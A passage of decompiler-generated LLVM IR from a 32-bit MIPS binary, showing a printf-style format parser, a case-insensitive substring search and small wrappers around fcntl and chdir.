  uselistorder i32* %a3.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %a1.global-to-local, { 2, 3, 4, 5, 6, 8, 7, 9, 0, 1 }
  uselistorder label %dec_label_pc_404814, { 1, 0 }
  uselistorder label %dec_label_pc_40480c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_4047bc, { 1, 0 }
  uselistorder label %dec_label_pc_404784, { 1, 0 }
  uselistorder label %dec_label_pc_404780, { 1, 0 }
  uselistorder label %dec_label_pc_40475c, { 1, 0 }
}

define i32 @function_40485c(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40485c:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %a1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %a0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_404864 = load i32, i32* @t9, align 4
  %v2_404864 = add i32 %v1_404864, 315732
  store i32 %v2_404864, i32* %gp.global-to-local, align 4
  %v0_404880 = load i32, i32* %a0.global-to-local, align 4
  store i32 %v0_404880, i32* %s2.global-to-local, align 4
  store i32 %arg2, i32* %s0.global-to-local, align 4
  store i32 0, i32* %s1.global-to-local, align 4
  %v2_404a40 = ptrtoint i32* %stack_var_-24 to i32
  %v1_404894.pre = load i32, i32* @v0, align 4
  %v1_404980 = add i32 %v1_404864, 282996
  %v2_404980 = inttoptr i32 %v1_404980 to i32*
  br label %dec_label_pc_404894

dec_label_pc_404894:                              ; preds = %dec_label_pc_404a88, %dec_label_pc_40485c
  %v2_404a9c18 = phi i32 [ 0, %dec_label_pc_40485c ], [ %v2_404a9c15, %dec_label_pc_404a88 ]
  %v0_40489c = phi i32 [ %arg2, %dec_label_pc_40485c ], [ %v1_404a88, %dec_label_pc_404a88 ]
  %v1_404894 = phi i32 [ %v1_404894.pre, %dec_label_pc_40485c ], [ 37, %dec_label_pc_404a88 ]
  %v1_4048b0 = phi i32 [ %v0_404880, %dec_label_pc_40485c ], [ %v3_404a8c, %dec_label_pc_404a88 ]
  %stack_var_8.0 = phi i32 [ %arg3, %dec_label_pc_40485c ], [ %stack_var_8.5, %dec_label_pc_404a88 ]
  %v2_404894 = icmp eq i32 %v1_4048b0, %v1_404894
  br i1 %v2_404894, label %dec_label_pc_404898, label %dec_label_pc_404a6c

dec_label_pc_404898:                              ; preds = %dec_label_pc_404894
  %v1_40489c = add i32 %v0_40489c, 1
  store i32 %v1_40489c, i32* %s0.global-to-local, align 4
  %v1_4048a0 = inttoptr i32 %v1_40489c to i8*
  %v2_4048a0 = load i8, i8* %v1_4048a0, align 1
  %v1_4048a8 = icmp eq i8 %v2_4048a0, 0
  br i1 %v1_4048a8, label %dec_label_pc_404a9c, label %dec_label_pc_4048ac

dec_label_pc_4048ac:                              ; preds = %dec_label_pc_404898
  %v3_4048a0 = zext i8 %v2_4048a0 to i32
  %v2_4048b0 = icmp eq i32 %v3_4048a0, %v1_404894
  store i32 45, i32* %v0.global-to-local, align 4
  br i1 %v2_4048b0, label %dec_label_pc_404a6c, label %dec_label_pc_4048b4

dec_label_pc_4048b4:                              ; preds = %dec_label_pc_4048ac
  %v2_4048b8 = icmp eq i8 %v2_4048a0, 45
  br i1 %v2_4048b8, label %dec_label_pc_4048c8, label %dec_label_pc_4048bc

dec_label_pc_4048bc:                              ; preds = %dec_label_pc_4048b4
  br label %dec_label_pc_4048c8

dec_label_pc_4048c8:                              ; preds = %dec_label_pc_4048b4, %dec_label_pc_4048bc
  %v1_4048c8 = add i32 %v0_40489c, 2
  store i32 %v1_4048c8, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4048d4

dec_label_pc_4048d4:                              ; preds = %dec_label_pc_4048d4, %dec_label_pc_4048c8
  %v3_4048e0 = phi i32 [ %v4_4048e0, %dec_label_pc_4048d4 ], [ %v1_4048c8, %dec_label_pc_4048c8 ]
  %v1_4048d8 = inttoptr i32 %v3_4048e0 to i8*
  %v2_4048d8 = load i8, i8* %v1_4048d8, align 1
  store i32 48, i32* %v0.global-to-local, align 4
  %v2_4048e0 = icmp eq i8 %v2_4048d8, 48
  %v4_4048e0 = add i32 %v3_4048e0, 1
  store i32 %v4_4048e0, i32* %s0.global-to-local, align 4
  br i1 %v2_4048e0, label %dec_label_pc_4048d4, label %dec_label_pc_4048e4

dec_label_pc_4048e4:                              ; preds = %dec_label_pc_4048d4
  store i32 %v3_4048e0, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4048f4

dec_label_pc_4048f4:                              ; preds = %dec_label_pc_4048f4, %dec_label_pc_4048e4
  %v0_4048f8 = phi i32 [ %v1_4048f8, %dec_label_pc_4048f4 ], [ %v3_4048e0, %dec_label_pc_4048e4 ]
  %v0_4048f4 = phi i32 [ %v4_404918, %dec_label_pc_4048f4 ], [ 48, %dec_label_pc_4048e4 ]
  %v1_4048f4 = add i32 %v0_4048f4, -48
  %v1_4048f8 = add i32 %v0_4048f8, 1
  store i32 %v1_4048f8, i32* %s0.global-to-local, align 4
  %v1_4048fc = inttoptr i32 %v1_4048f8 to i8*
  %v2_4048fc = load i8, i8* %v1_4048fc, align 1
  %v3_4048fc = zext i8 %v2_4048fc to i32
  store i32 %v3_4048fc, i32* %a1.global-to-local, align 4
  %v1_404900 = mul i32 %v1_4048f4, 8
  store i32 %v1_404900, i32* %a0.global-to-local, align 4
  %v1_404904 = add nuw nsw i32 %v3_4048fc, 208
  %v1_40490c = and i32 %v1_404904, 254
  %v2_404910 = mul i32 %v1_4048f4, 10
  %v1_404914 = icmp ult i32 %v1_40490c, 10
  %v4_404918 = add i32 %v3_4048fc, %v2_404910
  store i32 %v4_404918, i32* %v0.global-to-local, align 4
  br i1 %v1_404914, label %dec_label_pc_4048f4, label %dec_label_pc_40491c

dec_label_pc_40491c:                              ; preds = %dec_label_pc_4048f4
  store i32 115, i32* %v0.global-to-local, align 4
  %v2_404924 = icmp eq i8 %v2_4048fc, 115
  br i1 %v2_404924, label %dec_label_pc_404928, label %dec_label_pc_40494c

dec_label_pc_404928:                              ; preds = %dec_label_pc_40491c
  store i32 %stack_var_8.0, i32* %v0.global-to-local, align 4
  %v1_404934 = inttoptr i32 %stack_var_8.0 to i32*
  %v2_404934 = load i32, i32* %v1_404934, align 4
  store i32 %v2_404934, i32* %a1.global-to-local, align 4
  %v1_40493c = add i32 %stack_var_8.0, 4
  store i32 %v1_40493c, i32* %v0.global-to-local, align 4
  %v0_404940 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_404940, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_40494c

dec_label_pc_40494c:                              ; preds = %dec_label_pc_40491c, %dec_label_pc_404928
  %v0_404950 = phi i32 [ %v3_4048fc, %dec_label_pc_40491c ], [ %v2_404934, %dec_label_pc_404928 ]
  %stack_var_8.1 = phi i32 [ %stack_var_8.0, %dec_label_pc_40491c ], [ %v1_40493c, %dec_label_pc_404928 ]
  %v2_404950 = icmp eq i32 %v0_404950, 100
  store i32 120, i32* %v0.global-to-local, align 4
  br i1 %v2_404950, label %dec_label_pc_404954, label %dec_label_pc_4049a0

dec_label_pc_404954:                              ; preds = %dec_label_pc_40494c
  store i32 %stack_var_8.1, i32* %v0.global-to-local, align 4
  %v0_40495c = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_40495c, i32* %a0.global-to-local, align 4
  %v1_404960 = inttoptr i32 %stack_var_8.1 to i32*
  %v2_404960 = load i32, i32* %v1_404960, align 4
  store i32 %v2_404960, i32* %a1.global-to-local, align 4
  %v1_404968 = add i32 %stack_var_8.1, 4
  store i32 97, i32* %v0.global-to-local, align 4
  %v3_404980 = load i32, i32* %v2_404980, align 4
  %v1_404988 = add i32 %v3_404980, 18156
  call void @__pseudo_call(i32 %v1_404988)
  store i32 %v2_404864, i32* %gp.global-to-local, align 4
  %v0_40499c = load i32, i32* %s1.global-to-local, align 4
  %v1_40499c = load i32, i32* %v0.global-to-local, align 4
  %v2_40499c = add i32 %v1_40499c, %v0_40499c
  store i32 %v2_40499c, i32* %s1.global-to-local, align 4
  %v0_4049a0.pre = load i32, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_4049a0

dec_label_pc_4049a0:                              ; preds = %dec_label_pc_40494c, %dec_label_pc_404954
  %v2_404a9c16 = phi i32 [ %v2_40499c, %dec_label_pc_404954 ], [ %v2_404a9c18, %dec_label_pc_40494c ]
  %v1_4049a0 = phi i32 [ %v1_40499c, %dec_label_pc_404954 ], [ 120, %dec_label_pc_40494c ]
  %v0_4049a0 = phi i32 [ %v0_4049a0.pre, %dec_label_pc_404954 ], [ %v0_404950, %dec_label_pc_40494c ]
  %stack_var_8.2 = phi i32 [ %v1_404968, %dec_label_pc_404954 ], [ %stack_var_8.1, %dec_label_pc_40494c ]
  %v2_4049a0 = icmp eq i32 %v0_4049a0, %v1_4049a0
  %v3_4049a0 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v3_4049a0, i32* %a0.global-to-local, align 4
  br i1 %v2_4049a0, label %dec_label_pc_4049a4, label %dec_label_pc_4049c0

dec_label_pc_4049a4:                              ; preds = %dec_label_pc_4049a0
  store i32 %stack_var_8.2, i32* %v0.global-to-local, align 4
  %v1_4049b0 = inttoptr i32 %stack_var_8.2 to i32*
  %v2_4049b0 = load i32, i32* %v1_4049b0, align 4
  store i32 %v2_4049b0, i32* %a1.global-to-local, align 4
  %v1_4049bc = add i32 %stack_var_8.2, 4
  store i32 %v1_4049bc, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4049c0

dec_label_pc_4049c0:                              ; preds = %dec_label_pc_4049a0, %dec_label_pc_4049a4
  %v0_4049f8.pr = phi i32 [ %v0_4049a0, %dec_label_pc_4049a0 ], [ %v2_4049b0, %dec_label_pc_4049a4 ]
  store i32 88, i32* %v0.global-to-local, align 4
  %v2_4049c4 = icmp eq i32 %v0_4049f8.pr, 88
  br i1 %v2_4049c4, label %dec_label_pc_4049c8, label %dec_label_pc_4049f4

dec_label_pc_4049c8:                              ; preds = %dec_label_pc_4049c0
  store i32 %stack_var_8.2, i32* %v0.global-to-local, align 4
  %v1_4049d4 = inttoptr i32 %stack_var_8.2 to i32*
  %v2_4049d4 = load i32, i32* %v1_4049d4, align 4
  store i32 %v2_4049d4, i32* %a1.global-to-local, align 4
  %v1_4049d8 = add i32 %stack_var_8.2, 4
  store i32 65, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4049f4

dec_label_pc_4049f4:                              ; preds = %dec_label_pc_4049c0, %dec_label_pc_4049c8
  %v0_404a20.pr = phi i32 [ %v2_4049d4, %dec_label_pc_4049c8 ], [ %v0_4049f8.pr, %dec_label_pc_4049c0 ]
  %stack_var_8.3 = phi i32 [ %v1_4049d8, %dec_label_pc_4049c8 ], [ %stack_var_8.2, %dec_label_pc_4049c0 ]
  store i32 117, i32* %v0.global-to-local, align 4
  %v2_4049f8 = icmp eq i32 %v0_404a20.pr, 117
  store i32 %v3_4049a0, i32* %a0.global-to-local, align 4
  br i1 %v2_4049f8, label %dec_label_pc_4049fc, label %dec_label_pc_404a1c

dec_label_pc_4049fc:                              ; preds = %dec_label_pc_4049f4
  store i32 %stack_var_8.3, i32* %v0.global-to-local, align 4
  %v1_404a08 = inttoptr i32 %stack_var_8.3 to i32*
  %v2_404a08 = load i32, i32* %v1_404a08, align 4
  store i32 %v2_404a08, i32* %a1.global-to-local, align 4
  %v1_404a10 = add i32 %stack_var_8.3, 4
  store i32 %v1_404a10, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_404a1c

dec_label_pc_404a1c:                              ; preds = %dec_label_pc_4049f4, %dec_label_pc_4049fc
  %v0_404a20 = phi i32 [ %v2_404a08, %dec_label_pc_4049fc ], [ %v0_404a20.pr, %dec_label_pc_4049f4 ]
  store i32 99, i32* %v0.global-to-local, align 4
  %v2_404a20 = icmp eq i32 %v0_404a20, 99
  br i1 %v2_404a20, label %dec_label_pc_404a24, label %dec_label_pc_404a88

dec_label_pc_404a24:                              ; preds = %dec_label_pc_404a1c
  store i32 %stack_var_8.3, i32* %v0.global-to-local, align 4
  %v1_404a30 = inttoptr i32 %stack_var_8.3 to i32*
  %v2_404a30 = load i32, i32* %v1_404a30, align 4
  %v1_404a34 = add i32 %stack_var_8.3, 4
  store i32 %v1_404a34, i32* %v0.global-to-local, align 4
  store i32 %v3_4049a0, i32* %a0.global-to-local, align 4
  store i32 %v2_404a40, i32* %a1.global-to-local, align 4
  store i32 %v2_404a30, i32* %stack_var_-24, align 4
  %v3_404a50 = load i32, i32* %v2_404980, align 4
  %v1_404a58 = add i32 %v3_404a50, 17820
  call void @__pseudo_call(i32 %v1_404a58)
  %v0_404a6c.pre = load i32, i32* %gp.global-to-local, align 4
  %v0_404a70.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404a6c

dec_label_pc_404a6c:                              ; preds = %dec_label_pc_404894, %dec_label_pc_4048ac, %dec_label_pc_404a24
  %v0_404a70 = phi i32 [ %v1_40489c, %dec_label_pc_4048ac ], [ %v0_404a70.pre, %dec_label_pc_404a24 ], [ %v0_40489c, %dec_label_pc_404894 ]
  %v0_404a6c = phi i32 [ %v2_404864, %dec_label_pc_4048ac ], [ %v0_404a6c.pre, %dec_label_pc_404a24 ], [ %v2_404864, %dec_label_pc_404894 ]
  %stack_var_8.4 = phi i32 [ %stack_var_8.0, %dec_label_pc_4048ac ], [ %v1_404a34, %dec_label_pc_404a24 ], [ %stack_var_8.0, %dec_label_pc_404894 ]
  %v1_404a6c = add i32 %v0_404a6c, -32736
  %v2_404a6c = inttoptr i32 %v1_404a6c to i32*
  %v3_404a6c = load i32, i32* %v2_404a6c, align 4
  %v1_404a70 = inttoptr i32 %v0_404a70 to i8*
  %v2_404a70 = load i8, i8* %v1_404a70, align 1
  %v3_404a70 = zext i8 %v2_404a70 to i32
  store i32 %v3_404a70, i32* %a1.global-to-local, align 4
  %v1_404a74 = add i32 %v3_404a6c, 17712
  %v1_404a78 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_404a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_404a74)
  store i32 %v2_404864, i32* %gp.global-to-local, align 4
  %v0_404a84 = load i32, i32* %s1.global-to-local, align 4
  %v1_404a84 = add i32 %v0_404a84, 1
  store i32 %v1_404a84, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_404a88

dec_label_pc_404a88:                              ; preds = %dec_label_pc_404a1c, %dec_label_pc_404a6c
  %v2_404a9c15 = phi i32 [ %v1_404a84, %dec_label_pc_404a6c ], [ %v2_404a9c16, %dec_label_pc_404a1c ]
  %stack_var_8.5 = phi i32 [ %stack_var_8.4, %dec_label_pc_404a6c ], [ %stack_var_8.3, %dec_label_pc_404a1c ]
  %v0_404a88 = load i32, i32* %s0.global-to-local, align 4
  %v1_404a88 = add i32 %v0_404a88, 1
  store i32 %v1_404a88, i32* %s0.global-to-local, align 4
  %v1_404a8c = inttoptr i32 %v1_404a88 to i8*
  %v2_404a8c = load i8, i8* %v1_404a8c, align 1
  %v3_404a8c = zext i8 %v2_404a8c to i32
  store i32 %v3_404a8c, i32* %a0.global-to-local, align 4
  %v1_404a94 = icmp eq i8 %v2_404a8c, 0
  store i32 37, i32* %v0.global-to-local, align 4
  br i1 %v1_404a94, label %dec_label_pc_404a9c, label %dec_label_pc_404894

dec_label_pc_404a9c:                              ; preds = %dec_label_pc_404a88, %dec_label_pc_404898
  %v2_404a9c = phi i32 [ %v2_404a9c15, %dec_label_pc_404a88 ], [ %v2_404a9c18, %dec_label_pc_404898 ]
  %v0_404a9c = load i32, i32* %s2.global-to-local, align 4
  %v1_404a9c = icmp eq i32 %v0_404a9c, 0
  store i32 %v2_404a9c, i32* %v0.global-to-local, align 4
  br i1 %v1_404a9c, label %dec_label_pc_404ab4, label %dec_label_pc_404aa0

dec_label_pc_404aa0:                              ; preds = %dec_label_pc_404a9c
  %v1_404aa4 = inttoptr i32 %v0_404a9c to i32*
  %v2_404aa4 = load i32, i32* %v1_404aa4, align 4
  %v1_404aac = inttoptr i32 %v2_404aa4 to i8*
  store i8 0, i8* %v1_404aac, align 1
  %v0_404ab0 = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_404ab0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_404ab4

dec_label_pc_404ab4:                              ; preds = %dec_label_pc_404a9c, %dec_label_pc_404aa0
  %v4_404ac4 = phi i32 [ %v2_404a9c, %dec_label_pc_404a9c ], [ %v0_404ab0, %dec_label_pc_404aa0 ]
  ret i32 %v4_404ac4

; uselistorder directives
  uselistorder i32 %v3_404a8c, { 1, 0 }
  uselistorder i32 %v1_404a88, { 1, 2, 0 }
  uselistorder i32 %stack_var_8.3, { 0, 3, 2, 1, 6, 5, 4 }
  uselistorder i32 %stack_var_8.2, { 0, 3, 2, 1, 6, 5, 4 }
  uselistorder i32 %v0_4049a0, { 1, 0 }
  uselistorder i32 %v1_40499c, { 1, 0 }
  uselistorder i32 %stack_var_8.1, { 1, 0, 3, 2 }
  uselistorder i32 %v4_404918, { 1, 0 }
  uselistorder i32 %v1_4048f8, { 1, 2, 0 }
  uselistorder i32 %v1_4048f4, { 1, 0 }
  uselistorder i32 %v4_4048e0, { 1, 0 }
  uselistorder i8 %v2_4048a0, { 0, 2, 1 }
  uselistorder i32 %stack_var_8.0, { 1, 5, 0, 4, 3, 2 }
  uselistorder i32 %v0_40489c, { 1, 0, 2 }
  uselistorder i32 %v2_404a9c18, { 1, 0 }
  uselistorder i32 %v2_404864, { 2, 1, 0, 3, 4 }
  uselistorder i32* %v0.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23 }
  uselistorder i32* %s1.global-to-local, { 2, 0, 3, 1, 4, 5 }
  uselistorder i32* %s0.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %gp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %a1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %a0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder i8 48, { 2, 0, 1 }
  uselistorder i32 37, { 1, 0 }
  uselistorder label %dec_label_pc_404ab4, { 1, 0 }
  uselistorder label %dec_label_pc_404a88, { 1, 0 }
  uselistorder label %dec_label_pc_404a6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_404a1c, { 1, 0 }
  uselistorder label %dec_label_pc_4049f4, { 1, 0 }
  uselistorder label %dec_label_pc_4049c0, { 1, 0 }
  uselistorder label %dec_label_pc_4049a0, { 1, 0 }
  uselistorder label %dec_label_pc_40494c, { 1, 0 }
  uselistorder label %dec_label_pc_4048c8, { 1, 0 }
}

define i32 @function_404acc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404acc:
  store i32 %arg3, i32* @a3, align 4
  %stack_var_8 = alloca i32, align 4
  %v3_404ae4 = load i32, i32* @global_var_4499d0.88, align 4
  %v2_404ae8 = ptrtoint i32* %stack_var_8 to i32
  store i32 %arg2, i32* %stack_var_8, align 4
  %v1_404b00 = add i32 %v3_404ae4, 18524
  call void @__pseudo_call(i32 %v1_404b00)
  ret i32 %v2_404ae8
}

define i32 @function_404b20(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_404b20:
  %t2.global-to-local = alloca i32, align 4
  store i32 0, i32* %t2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_404b2c

dec_label_pc_404b2c:                              ; preds = %dec_label_pc_404b2c, %dec_label_pc_404b20
  %v0_404b30 = phi i32 [ %v3_404b38, %dec_label_pc_404b2c ], [ %arg2, %dec_label_pc_404b20 ]
  %v0_404b2c = phi i32 [ %v1_404b2c, %dec_label_pc_404b2c ], [ 0, %dec_label_pc_404b20 ]
  %v1_404b2c = add i32 %v0_404b2c, 1
  %v1_404b30 = inttoptr i32 %v0_404b30 to i8*
  %v2_404b30 = load i8, i8* %v1_404b30, align 1
  %v1_404b38 = icmp eq i8 %v2_404b30, 0
  %v3_404b38 = add i32 %v0_404b30, 1
  br i1 %v1_404b38, label %dec_label_pc_404b3c, label %dec_label_pc_404b2c

dec_label_pc_404b3c:                              ; preds = %dec_label_pc_404b2c
  %v0_404b64.pre = load i32, i32* @a1, align 4
  br label %dec_label_pc_404b48

dec_label_pc_404b48:                              ; preds = %dec_label_pc_404ba4, %dec_label_pc_404b3c
  %v0_404b64 = phi i32 [ %v1_404b64, %dec_label_pc_404ba4 ], [ %v0_404b64.pre, %dec_label_pc_404b3c ]
  %v0_404b4c = phi i32 [ %v0_404b4c5, %dec_label_pc_404ba4 ], [ %v3_404b38, %dec_label_pc_404b3c ]
  %v0_404b68 = phi i32 [ %v1_404b68, %dec_label_pc_404ba4 ], [ %tmp, %dec_label_pc_404b3c ]
  %v1_404b48 = inttoptr i32 %v0_404b68 to i8*
  %v2_404b48 = load i8, i8* %v1_404b48, align 1
  %v3_404b48 = sext i8 %v2_404b48 to i32
  %v1_404b4c = inttoptr i32 %v0_404b4c to i8*
  %v2_404b4c = load i8, i8* %v1_404b4c, align 1
  %v3_404b4c = sext i8 %v2_404b4c to i32
  %v1_404b50 = add nsw i32 %v3_404b48, 191
  %v1_404b54 = add nsw i32 %v3_404b4c, 191
  %v1_404b58 = and i32 %v1_404b50, 254
  %v1_404b5c = and i32 %v1_404b54, 254
  %v1_404b60 = icmp ult i32 %v1_404b58, 26
  %v1_404b64 = add i32 %v0_404b64, -1
  %v1_404b68 = add i32 %v0_404b68, 1
  %v1_404b6c = icmp eq i1 %v1_404b60, false
  %v3_404b6c = icmp ult i32 %v1_404b5c, 26
  br i1 %v1_404b6c, label %dec_label_pc_404b78, label %dec_label_pc_404b70

dec_label_pc_404b70:                              ; preds = %dec_label_pc_404b48
  %v1_404b74 = or i32 %v3_404b48, 96
  br label %dec_label_pc_404b78

dec_label_pc_404b78:                              ; preds = %dec_label_pc_404b48, %dec_label_pc_404b70
  %v0_404b84 = phi i32 [ %v3_404b48, %dec_label_pc_404b48 ], [ %v1_404b74, %dec_label_pc_404b70 ]
  %v1_404b78 = icmp eq i1 %v3_404b6c, false
  br i1 %v1_404b78, label %dec_label_pc_404b84, label %dec_label_pc_404b7c

dec_label_pc_404b7c:                              ; preds = %dec_label_pc_404b78
  %v1_404b80 = or i32 %v3_404b4c, 96
  br label %dec_label_pc_404b84

dec_label_pc_404b84:                              ; preds = %dec_label_pc_404b78, %dec_label_pc_404b7c
  %v1_404b84 = phi i32 [ %v3_404b4c, %dec_label_pc_404b78 ], [ %v1_404b80, %dec_label_pc_404b7c ]
  %v2_404b84 = icmp eq i32 %v0_404b84, %v1_404b84
  br i1 %v2_404b84, label %dec_label_pc_404b88, label %dec_label_pc_404b9c

dec_label_pc_404b88:                              ; preds = %dec_label_pc_404b84
  %v0_404b8c = load i32, i32* %t2.global-to-local, align 4
  %v2_404b8c = icmp eq i32 %v0_404b8c, %v1_404b2c
  %v6_404b8c = add i32 %v0_404b8c, %arg2
  br i1 %v2_404b8c, label %dec_label_pc_404b90, label %dec_label_pc_404ba4

dec_label_pc_404b90:                              ; preds = %dec_label_pc_404b88
  %v4_404b94 = sub i32 %v1_404b68, %tmp
  ret i32 %v4_404b94

dec_label_pc_404b9c:                              ; preds = %dec_label_pc_404b84
  store i32 0, i32* %t2.global-to-local, align 4
  br label %dec_label_pc_404ba4

dec_label_pc_404ba4:                              ; preds = %dec_label_pc_404b88, %dec_label_pc_404b9c
  %v2_404ba4 = phi i32 [ %v0_404b8c, %dec_label_pc_404b88 ], [ 0, %dec_label_pc_404b9c ]
  %v0_404b4c5 = phi i32 [ %v6_404b8c, %dec_label_pc_404b88 ], [ %arg2, %dec_label_pc_404b9c ]
  %v1_404ba4 = icmp sgt i32 %v1_404b64, 0
  %v3_404ba4 = add i32 %v2_404ba4, 1
  store i32 %v3_404ba4, i32* %t2.global-to-local, align 4
  br i1 %v1_404ba4, label %dec_label_pc_404b48, label %dec_label_pc_404ba8

dec_label_pc_404ba8:                              ; preds = %dec_label_pc_404ba4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_404b8c, { 1, 0, 2 }
  uselistorder i32 %v0_404b30, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %t2.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32 26, { 1, 2, 3, 4, 0 }
  uselistorder i32 254, { 0, 1, 2, 4, 5, 3, 6 }
  uselistorder i32 191, { 1, 2, 0 }
  uselistorder i8 0, { 0, 20, 1, 2, 3, 4, 21, 22, 5, 6, 7, 8, 23, 24, 25, 26, 9, 10, 27, 11, 12, 28, 13, 14, 15, 29, 30, 16, 17, 18, 19 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_404ba4, { 1, 0 }
  uselistorder label %dec_label_pc_404b84, { 1, 0 }
  uselistorder label %dec_label_pc_404b78, { 1, 0 }
}

define i32 @function_404bc0() local_unnamed_addr {
dec_label_pc_404bc0:
  %s0.global-to-local = alloca i32, align 4
  %v0_404bdc = load i32, i32* @a1, align 4
  %v1_404bdc = add i32 %v0_404bdc, -33
  %v1_404be4 = icmp ult i32 %v1_404bdc, 3
  %v2_404be4 = zext i1 %v1_404be4 to i32
  store i32 %v2_404be4, i32* @v1, align 4
  %v3_404be8 = load i32, i32* @global_var_449b48.177, align 4
  store i32 %v3_404be8, i32* @t9, align 4
  %v1_404bf4 = icmp eq i1 %v1_404be4, false
  br i1 %v1_404bf4, label %dec_label_pc_404c10, label %dec_label_pc_404bf8

dec_label_pc_404bf8:                              ; preds = %dec_label_pc_404bc0
  %v1_404bfc = call i32 @function_404c50()
  %v1_404c14.pre = load i32, i32* @a1, align 4
  br label %dec_label_pc_404c10

dec_label_pc_404c10:                              ; preds = %dec_label_pc_404bc0, %dec_label_pc_404bf8
  %v1_404c14 = phi i32 [ %v0_404bdc, %dec_label_pc_404bc0 ], [ %v1_404c14.pre, %dec_label_pc_404bf8 ]
  %v0_404c14 = load i32, i32* @a0, align 4
  %v2_404c14 = call i32 (i32, i32, ...) @fcntl(i32 %v0_404c14, i32 %v1_404c14)
  %v3_404c18 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_404c18, i32* @t9, align 4
  %v0_404c1c = load i32, i32* @a3, align 4
  %v1_404c1c = icmp eq i32 %v0_404c1c, 0
  store i32 %v2_404c14, i32* %s0.global-to-local, align 4
  br i1 %v1_404c1c, label %dec_label_pc_404c38, label %dec_label_pc_404c20

dec_label_pc_404c20:                              ; preds = %dec_label_pc_404c10
  %v1_404c24 = call i32 @function_4056e0()
  %v0_404c30 = load i32, i32* %s0.global-to-local, align 4
  %v2_404c30 = inttoptr i32 %v1_404c24 to i32*
  store i32 %v0_404c30, i32* %v2_404c30, align 4
  br label %dec_label_pc_404c38

dec_label_pc_404c38:                              ; preds = %dec_label_pc_404c10, %dec_label_pc_404c20
  %v4_404c40 = phi i32 [ %v2_404c14, %dec_label_pc_404c10 ], [ -1, %dec_label_pc_404c20 ]
  ret i32 %v4_404c40

; uselistorder directives
  uselistorder label %dec_label_pc_404c38, { 1, 0 }
  uselistorder label %dec_label_pc_404c10, { 1, 0 }
}

define i32 @function_404c50() local_unnamed_addr {
dec_label_pc_404c50:
  %s0.global-to-local = alloca i32, align 4
  %v0_404c74 = load i32, i32* @a3, align 4
  %v3_404c84 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_404c84, i32* @t9, align 4
  %v1_404c88 = icmp eq i32 %v0_404c74, 0
  store i32 4220, i32* %s0.global-to-local, align 4
  br i1 %v1_404c88, label %dec_label_pc_404ca4, label %dec_label_pc_404c8c

dec_label_pc_404c8c:                              ; preds = %dec_label_pc_404c50
  %v1_404c90 = call i32 @function_4056e0()
  %v0_404c9c = load i32, i32* %s0.global-to-local, align 4
  %v2_404c9c = inttoptr i32 %v1_404c90 to i32*
  store i32 %v0_404c9c, i32* %v2_404c9c, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404ca4

dec_label_pc_404ca4:                              ; preds = %dec_label_pc_404c50, %dec_label_pc_404c8c
  %v0_404ca4 = phi i32 [ 4220, %dec_label_pc_404c50 ], [ -1, %dec_label_pc_404c8c ]
  ret i32 %v0_404ca4

; uselistorder directives
  uselistorder label %dec_label_pc_404ca4, { 1, 0 }
}

define i32 @function_404cc0(i8* %arg1) local_unnamed_addr {
dec_label_pc_404cc0:
  %s0.global-to-local = alloca i32, align 4
  %v3_404ce0 = call i32 @chdir(i8* %arg1)
  %v3_404ce4 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_404ce4, i32* @t9, align 4
  %v0_404ce8 = load i32, i32* @a3, align 4
  %v1_404ce8 = icmp eq i32 %v0_404ce8, 0
  store i32 %v3_404ce0, i32* %s0.global-to-local, align 4
  br i1 %v1_404ce8, label %dec_label_pc_404d04, label %dec_label_pc_404cec

dec_label_pc_404cec:                              ; preds = %dec_label_pc_404cc0
  %v1_404cf0 = call i32 @function_4056e0()
  %v0_404cfc = load i32, i32* %s0.global-to-local, align 4
  %v2_404cfc = inttoptr i32 %v1_404cf0 to i32*
  store i32 %v0_404cfc, i32* %v2_404cfc, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
